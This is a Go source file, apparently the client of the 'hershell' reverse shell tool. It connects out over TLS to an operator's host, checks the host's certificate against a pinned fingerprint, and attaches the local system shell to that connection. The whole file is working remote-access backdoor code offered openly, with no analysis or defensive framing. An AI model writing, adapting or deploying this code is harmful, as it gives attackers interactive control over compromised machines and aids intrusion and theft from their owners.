package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"hershell/shell"
	"net"
	"os"
	"strings"
)

const (
	errCouldNotDecode  = 1 << iota
	errHostUnreachable = iota
	errBadFingerprint  = iota
)

var (
	connectString string
	fingerPrint   string
)

func interactiveShell(conn net.Conn) {
	var (
		prompt  = ">>> "
		scanner = bufio.NewScanner(conn)
	)

	conn.Write([]byte(prompt))

	for scanner.Scan() {
		command := scanner.Text()
		shell.ExecuteCmd(command, conn)
		conn.Write([]byte(prompt))
	}
}

func runShell(conn net.Conn) {
	cmd := shell.GetShell()
	wConn := shell.NewWindowsConn(conn)
	cmd.Stdout = wConn
	cmd.Stderr = wConn
	cmd.Stdin = wConn
	cmd.Run()
}

func checkKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid, nil
}

func reverse(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)
	config := &tls.Config{InsecureSkipVerify: true}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(errHostUnreachable)
	}

	defer conn.Close()

	if ok, err := checkKeyPin(conn, fingerprint); err != nil || !ok {
		os.Exit(errBadFingerprint)
	}
	//interactiveShell(conn)
	runShell(conn)
}

func main() {
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(errCouldNotDecode)
		}
		reverse(connectString, bytesFingerprint)
	}
}
